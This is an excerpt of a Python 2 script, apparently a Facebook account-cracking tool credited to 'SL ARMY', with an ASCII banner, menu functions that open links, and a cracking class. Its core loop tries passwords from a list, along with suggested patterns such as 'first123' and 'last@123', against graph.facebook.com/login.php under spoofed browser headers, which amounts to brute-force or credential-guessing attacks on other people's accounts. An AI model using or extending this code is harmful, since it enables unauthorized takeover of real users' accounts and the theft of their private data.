...
def banner():
	os.system("clear")
	os.system('echo  "\n\n    ▄▄▄       ███▄ ▄███▓ ▄▄▄▄     █████▒\n   ▒████▄    ▓██▒▀█▀ ██▒▓█████▄ ▓██   ▒ \n   ▒██  ▀█▄  ▓██    ▓██░▒██▒ ▄██▒████ ░ \n   ░██▄▄▄▄██ ▒██    ▒██ ▒██░█▀  ░▓█▒  ░ \n    ▓█   ▓██▒▒██▒   ░██▒░▓█  ▀█▓░▒█░    \n    ▒▒   ▓▒█░░ ▒░   ░  ░░▒▓███▀▒ ▒ ░    \n     ▒   ▒▒ ░░  ░      ░▒░▒   ░  ░      \n     ░   ▒   ░      ░    ░    ░  ░ ░    \n         ░  ░       ░    ░              \n                              ░         \n\n╔═══════════════════════════════════════════╗\n║  Author   : SL ARMY                   ║\n║  Github   : https://github.com/Chanubatta   ║           \n║  Fb       : https://me.fb/Chanuka2002       ║           \n╚═══════════════════════════════════════════╝" | lolcat -a -d 2 -s 50')
	print("")
...
def azimvau():
    ...
    if nunu in ('open', 'Open', 'OPEN'):
        raw_input('\n %s*%s PRESS ENTER ' % (O, N))
        os.system('xdg-open https://m.youtube.com/watch?v=NdJKHMgfGGzx4Geq')
        azimvau()
    try:
...
def mr_error():
    ...
    os.system("xdg-open https://t.me/fuck")
...
class __crack__:
    ...
    def plerr(self):
        ...
        if ___axim_xau___ in ('Y', 'y'):
            print '\n %s[%s!%s] ADD MANUAL PASSWORD EXAMPLE : first123,first@123,last123,last@123'%(N,M,N)
    ...
    def __mbasic__(self, user, __axm__):
        ...
        for pw in __axm__:
            ...
            ses.headers.update({"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_nunu,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://graph.facebook.com")
            b = ses.post("https://graph.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
